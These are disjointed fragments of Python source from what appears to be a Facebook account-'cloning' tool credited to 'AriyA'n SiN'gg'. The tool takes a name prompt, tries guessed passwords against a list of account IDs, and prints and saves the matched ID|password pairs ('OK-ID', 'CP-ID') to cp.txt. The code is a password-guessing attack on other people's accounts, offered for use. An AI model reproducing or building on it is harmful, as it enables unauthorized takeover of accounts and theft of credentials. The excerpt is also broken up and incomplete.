 ...
      [ AUTHOR   : AriyA'n SiN'gg     
      [ Facebook   : AriyA'n SiN'gg 
      [ YouTube : Ariyan Ahmed Nazmul       
      [ POWER BY : \x1b[1;32mKST Ariyan\x1b[1;97m             
 ...
                                 self.oldcrack() 
                 elif hoga in ["7", "07"]: 
                         os.system('am start https://www.facebook.com/horny.lover.xxx1') 
                 else: 
                         Main() 
 ...
                 x = 111 
                 xx = 999 
                 nam = input("%s [?] TYPE A NAME %s(EX:fahim ", " ARIYAN ): "%(Y,G)) 
                 nam = nam.replace(" ", "") 
 ...
                 ]) 
                 sys.stdout.write( 
                         "\r\r %s\033[0;93m[ARIYAN -CLONING : \033[0;97m %s/%s -> \033[0;92m [OK-ID:%s ]- \033[0;93m[CP-ID:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp)) 
                 ); sys.stdout.flush() 
                 for pw in pwx: 
                         pw = pw.lower() 
 ...
                                 print("\r \033[0;92m[ARIYAN -OK-ID] %s|%s\033[0;97m         "%(uid, pw)) 
 ...
                                 open("cp.txt","a").write(" ARIYAN -CP] %s|%s\n"%(uid, pw)) 
                                 break 
                         else: 
                                 continue 
